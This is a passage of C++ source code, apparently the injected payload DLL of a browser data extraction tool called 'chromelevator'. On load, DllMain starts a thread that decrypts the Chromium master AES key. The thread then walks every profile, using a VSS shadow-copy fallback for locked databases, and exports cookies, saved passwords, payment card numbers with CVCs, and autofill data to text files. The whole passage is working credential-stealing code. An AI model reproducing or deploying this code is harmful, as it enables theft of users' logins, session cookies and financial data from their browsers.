            std::replace(uriPath.begin(), uriPath.end(), '\\', '/');

            int openRc = sqlite3_open_v2(uriPath.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr);
            if (openRc != SQLITE_OK)
            {
                m_logger.Log("[-] Failed to open database " + dbPath.u8string() + ": " + (db ? sqlite3_errmsg(db) : std::string("N/A")));
                if (db) { sqlite3_close_v2(db); db = nullptr; }

                // Fallback: copy DB (and possible -wal/-shm) to a temp directory and open the copy
                try {
                    fs::path tempDir = fs::temp_directory_path() / (std::string("chromelev_") + std::to_string(GetCurrentProcessId()) + "_" + std::to_string(GetTickCount64()));
                    std::error_code ec;
                    fs::create_directories(tempDir, ec);
                    if (ec) {
                        m_logger.Log("[-] Fallback failed to create temp directory: " + tempDir.u8string());
                        return;
                    }

                    tempCleanup.active = true;
                    tempCleanup.dir = tempDir;

                    fs::path tempDb = tempDir / dbPath.filename();

                    // VSS snapshot-based copy helper
                    auto copyWithVss = [&](const fs::path &srcMain, const fs::path &dstMain) -> bool {
                        HRESULT hr = S_OK;
                        bool comInited = SUCCEEDED(CoInitializeEx(nullptr, COINIT_MULTITHREADED));
                        IVssBackupComponents* vss = nullptr;
                        IVssAsync* asyncOp = nullptr;
                        auto cleanup = [&]() {
                            if (asyncOp) { asyncOp->Release(); asyncOp = nullptr; }
                            if (vss) { vss->Release(); vss = nullptr; }
                            if (comInited) CoUninitialize();
                        };

                        hr = CreateVssBackupComponents(&vss);
                        if (FAILED(hr) || !vss) { cleanup(); return false; }
                        hr = vss->InitializeForBackup();
                        if (FAILED(hr)) { cleanup(); return false; }
                        // Use a non-intrusive context suitable for file-copy style backups
                        hr = vss->SetContext(VSS_CTX_FILE_SHARE_BACKUP);
                        if (FAILED(hr)) { cleanup(); return false; }

                        VSS_ID setId = GUID_NULL; VSS_ID snapId = GUID_NULL;
                        hr = vss->StartSnapshotSet(&setId);
                        if (FAILED(hr)) { cleanup(); return false; }

                        // Resolve volume root for the source path
                        std::wstring srcFull = srcMain.wstring();
                        WCHAR volumePath[MAX_PATH] = {0};
                        if (!GetVolumePathNameW(srcFull.c_str(), volumePath, MAX_PATH)) { cleanup(); return false; }

                        hr = vss->AddToSnapshotSet(volumePath, GUID_NULL, &snapId);
                        if (FAILED(hr)) { cleanup(); return false; }

                        hr = vss->DoSnapshotSet(&asyncOp);
                        if (FAILED(hr) || !asyncOp) { cleanup(); return false; }
                        hr = asyncOp->Wait(INFINITE);
                        if (FAILED(hr)) { cleanup(); return false; }

                        VSS_SNAPSHOT_PROP prop = {};
                        hr = vss->GetSnapshotProperties(snapId, &prop);
                        if (FAILED(hr)) { cleanup(); return false; }

                        // Build snapshot path for main DB and optional WAL/SHM
                        std::wstring volRoot = volumePath;
                        if (srcFull.rfind(volRoot, 0) != 0) {
                            VssFreeSnapshotProperties(&prop);
                            cleanup();
                            return false;
                        }
                        std::wstring rel = srcFull.substr(volRoot.size());
                        std::wstring snapRoot = prop.m_pwszSnapshotDeviceObject; // e.g. \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX
                        std::wstring snapMain = snapRoot + L"\\" + rel;

                        auto fileExistsW = [](const std::wstring &p) -> bool {
                            DWORD attrs = GetFileAttributesW(p.c_str());
                            return (attrs != INVALID_FILE_ATTRIBUTES) && !(attrs & FILE_ATTRIBUTE_DIRECTORY);
                        };

                        BOOL ok = CopyFileW(snapMain.c_str(), dstMain.wstring().c_str(), FALSE);
                        if (!ok) {
                            VssFreeSnapshotProperties(&prop);
                            // Try to cleanup the snapshot before exit
                            LONG lDeleted = 0; VSS_ID idNon = GUID_NULL;
                            vss->DeleteSnapshots(snapId, VSS_OBJECT_SNAPSHOT, TRUE, &lDeleted, &idNon);
                            cleanup();
                            return false;
                        }

                        // Try copy WAL/SHM from the snapshot if they exist
                        std::wstring snapWal = snapMain + L"-wal";
                        std::wstring snapShm = snapMain + L"-shm";
                        std::wstring dstWal = dstMain.wstring() + L"-wal";
                        std::wstring dstShm = dstMain.wstring() + L"-shm";
                        if (fileExistsW(snapWal)) {
                            CopyFileW(snapWal.c_str(), dstWal.c_str(), FALSE);
                        }
                        if (fileExistsW(snapShm)) {
                            CopyFileW(snapShm.c_str(), dstShm.c_str(), FALSE);
                        }

                        VssFreeSnapshotProperties(&prop);

                        // Delete snapshot
                        LONG lDeleted = 0; VSS_ID idNon = GUID_NULL;
                        vss->DeleteSnapshots(snapId, VSS_OBJECT_SNAPSHOT, TRUE, &lDeleted, &idNon);

                        cleanup();
                        return true;
                    };

                bool usedVss = false;

                std::error_code ecCopy;
                fs::copy_file(dbPath, tempDb, fs::copy_options::overwrite_existing, ecCopy);
                if (ecCopy) {
                    m_logger.Log("[-] Fallback failed to copy database file to: " + tempDb.u8string() + ", error=" + std::to_string(ecCopy.value()) + ". Trying VSS snapshot...");
                    if (!copyWithVss(dbPath, tempDb)) {
                        m_logger.Log("[-] VSS snapshot copy failed.");
                        return;
                    }
                    usedVss = true;
                    m_logger.Log("[*] Copied database via VSS snapshot to: " + tempDb.u8string());
                }

                // Copy -wal and -shm if present to keep a consistent snapshot (skip if VSS already handled it)
                if (!usedVss) {
                    fs::path walPath = dbPath; walPath += "-wal";
                    fs::path shmPath = dbPath; shmPath += "-shm";
                    if (fs::exists(walPath)) {
                        fs::copy_file(walPath, fs::path(tempDb.string() + "-wal"), fs::copy_options::overwrite_existing, ec);
                        if (ec) {
                            m_logger.Log("[-] Fallback failed to copy WAL file: " + walPath.u8string());
                            return;
                        }
                    }
                    if (fs::exists(shmPath)) {
                        fs::copy_file(shmPath, fs::path(tempDb.string() + "-shm"), fs::copy_options::overwrite_existing, ec);
                        if (ec) {
                            m_logger.Log("[-] Fallback failed to copy SHM file: " + shmPath.u8string());
                            return;
                        }
                    }
                }

                std::string tempUri = "file:" + tempDb.string() + "?mode=ro&immutable=1";
                std::replace(tempUri.begin(), tempUri.end(), '\\', '/');

                openRc = sqlite3_open_v2(tempUri.c_str(), &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr);
                if (openRc != SQLITE_OK) {
                    m_logger.Log("[-] Failed to open fallback database copy " + tempDb.u8string() + ": " + (db ? sqlite3_errmsg(db) : std::string("N/A")));
                    if (db) { sqlite3_close_v2(db); db = nullptr; }
                    return;
                } else {
                    m_logger.Log("[*] Opened database via temporary copy: " + tempDb.u8string());
                }
            } catch (const std::exception &ex) {
                m_logger.Log(std::string("[-] Exception during fallback open: ") + ex.what());
                return;
            }
        }

        if (!db) {
            m_logger.Log("[-] Unable to open database file after all attempts");
            return;
        }

        // Process database with actual data extraction logic
        std::any preQueryState;
        if (m_config.preQuerySetup) {
            auto stateOpt = m_config.preQuerySetup(db);
            if (stateOpt) {
                preQueryState = *stateOpt;
            }
        }

        sqlite3_stmt *stmt = nullptr;
        int prepRc = sqlite3_prepare_v2(db, m_config.sqlQuery.c_str(), -1, &stmt, nullptr);
        if (prepRc != SQLITE_OK) {
            m_logger.Log("[-] Failed to prepare query: " + std::string(sqlite3_errmsg(db)));
            sqlite3_close_v2(db);
            return;
        }

        std::vector<std::string> entries;
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            auto entryOpt = m_config.jsonFormatter(stmt, m_aesKey, preQueryState);
            if (entryOpt) {
                entries.push_back(*entryOpt);
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close_v2(db);

        // Remove any legacy JSON output to ensure only TXT remains (even if no entries are written)
        {
            fs::path browserDir = m_baseOutputPath / m_browserName;
            fs::path profileName = m_profilePath.filename();
            fs::path profileDir = browserDir / profileName;
            try {
                fs::path legacyJson = profileDir / (m_config.outputFileName + ".json");
                if (fs::exists(legacyJson)) {
                    std::error_code ec;
                    fs::remove(legacyJson, ec);
                }
            } catch (...) {}
        }

        if (!entries.empty()) {
            // Build per-browser/per-profile output directory: <base>/<BrowserName>/<ProfileName>/
            fs::path browserDir = m_baseOutputPath / m_browserName;
            fs::path profileName = m_profilePath.filename();
            fs::path profileDir = browserDir / profileName;
            try {
                fs::create_directories(profileDir);
            } catch (const fs::filesystem_error &ex) {
                m_logger.Log("[-] Failed to create output directory: " + profileDir.u8string() + " (" + std::string(ex.what()) + ")");
            }

            fs::path outputPath = profileDir / (m_config.outputFileName + ".txt");
                std::ofstream outFile(outputPath);
            if (outFile) {
                if (m_config.outputFileName == "cookies") {
                    outFile << "# Netscape HTTP Cookie File\n";
                    outFile << "# This file is generated by chromelevator.\n";
                    outFile << "# domain\tflag\tpath\tsecure\texpiration\tname\tvalue\n";
                } else if (m_config.outputFileName == "passwords") {
                    outFile << "# URL\tUsername\tPassword\n";
                } else if (m_config.outputFileName == "payments") {
                    outFile << "# NameOnCard\tExpMonth\tExpYear\tCardNumber\tCVC\n";
                } else if (m_config.outputFileName == "autofill") {
                    outFile << "# Name\tValue\n";
                }
                for (const auto &line : entries) {
                    outFile << line << "\n";
                }
                m_logger.Log("[+] Exported " + std::to_string(entries.size()) + " entries to " + outputPath.u8string());
            } else {
                m_logger.Log("[-] Failed to write output file: " + outputPath.u8string());
            }
        }
    }

    private:
        fs::path m_profilePath;
        const Data::ExtractionConfig &m_config;
        const std::vector<uint8_t> &m_aesKey;
        PipeLogger &m_logger;
        fs::path m_baseOutputPath;
        std::string m_browserName;
    };

    class DecryptionOrchestrator
    {
    public:
        DecryptionOrchestrator(LPCWSTR lpcwstrPipeName) : m_logger(lpcwstrPipeName)
        {
            if (!m_logger.isValid())
            {
                throw std::runtime_error("Failed to connect to named pipe from injector.");
            }
            ReadPipeParameters();
        }

        void Run()
        {
            BrowserManager browserManager;
            const auto &browserConfig = browserManager.getConfig();
            m_logger.Log("[*] Decryption process started for " + browserConfig.name);

            std::vector<uint8_t> aesKey;
            {
                MasterKeyDecryptor keyDecryptor(m_logger);
                fs::path localStatePath = browserManager.getUserDataRoot() / "Local State";
                aesKey = keyDecryptor.Decrypt(browserConfig, localStatePath);
            }
            m_logger.Log("[+] Decrypted AES Key: " + Utils::BytesToHexString(aesKey));

            ProfileEnumerator enumerator(browserManager.getUserDataRoot(), m_logger);
            auto profilePaths = enumerator.FindProfiles();

            for (const auto &profilePath : profilePaths)
            {
                m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
                for (const auto &dataConfig : Data::GetExtractionConfigs())
                {
                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
                    extractor.Extract();
                }
            }

            m_logger.Log("[*] All profiles processed. Decryption process finished.");
        }

    private:
        void ReadPipeParameters()
        {
            char buffer[MAX_PATH + 1] = {0};
            DWORD bytesRead = 0;
            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
            buffer[bytesRead] = '\0';
            m_outputPath = buffer;
        }

        PipeLogger m_logger;
        fs::path m_outputPath;
    };
}

struct ThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromInjector;
};

DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam)
{
    // lpParam is a pointer to ThreadParams allocated in DllMain
    ThreadParams *params = static_cast<ThreadParams *>(lpParam);
    if (!params)
        return 0;

    HMODULE selfModule = params->hModule_dll;
    LPCWSTR pipeName = static_cast<LPCWSTR>(params->lpPipeNamePointerFromInjector);

    try
    {
        Payload::DecryptionOrchestrator orchestrator(pipeName);
        orchestrator.Run();
    }
    catch (const std::exception &e)
    {
        try
        {
            Payload::PipeLogger errorLogger(pipeName);
            if (errorLogger.isValid())
            {
                errorLogger.Log(std::string("[-] CRITICAL DLL ERROR: ") + e.what());
            }
        }
        catch (...)
        {
            // Failsafe if logging itself fails.
        }
    }

    // Clean up the params before exiting the thread
    delete params;
    FreeLibraryAndExitThread(selfModule, 0);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved)
{
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);

        auto params = new (std::nothrow) ThreadParams{hModule, lpReserved};
        if (!params)
            return TRUE;

        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, params, 0, NULL);
        if (hThread)
        {
            CloseHandle(hThread);
        }
        else
        {
            delete params;
        }
    }
    return TRUE;
}
